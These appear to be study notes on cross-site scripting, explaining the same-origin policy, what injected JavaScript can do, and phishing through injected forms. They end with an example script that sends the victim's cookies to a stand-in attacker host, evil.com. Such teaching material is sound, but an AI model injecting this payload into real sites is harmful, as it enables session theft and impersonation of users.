# XSS
XSS is a code injection attack which allows the attacker to execute malicious JAVASCRIPT in another user's browser

- JS is a client side scripting  language where code runs in your browser
- JS can be written inside HTML files inside HTML <script> tag
- Code within this <script> tags is executed in the context of the site

The web's security model is based on the same origin policy
Origin refers to the combination of 
- 1 The url scheme eg http or https
- 2 the hostname e.g google
- 3 the port number, typically 80 for public sites

- This basically means that code (HTML, CSS, JS) from http://somesite.com can only access the data of http://somesite.com
which means that in theory http://evil.com cannot access data from any site other than http://evil.com!
- The key thing here is how do we define code from http://somesite.com.
- This is HTML, CSS , JS which served from that server
- XSS is all about making the browser believe that malicious code came from a trusted site!

- JS runs in a very restricted environment on your browser and it has limited access to that user's operating system and files
- Access cookies which usually contain session information - this can be used to impersonate a user
- send XmlHTTP Requests with any content to any destination
- Edit the DOM of the current website to anything it wants
- JS in modern HTML5 browsers can access the user's geolocation, webcam, certianfiles on user computer
- Remember all this while you believe that you are ona trusted site
- combining the capability of JS and socail engineering hacker can steel a lot.

Phising can happen with this
- Insert a form into DOM of the trusted page and direct the results to be submitted to the attackers server

http://excess-xss.com - great resource to learn all about XSS

#### Example

- 3 actors in XSS attack = Attacker, website, victim
- XSS attack targets website not a specific user
- Any user of that website can be compromised
- Name of attacker's website http://www.evil.com
- Attacker seeks: Access to victim's session ID sent via cookies
- script attacker wants to inject
```javascript
<script> 
window.location="http://www.evil.com/?cookie="+document.cookie;
</script>
```
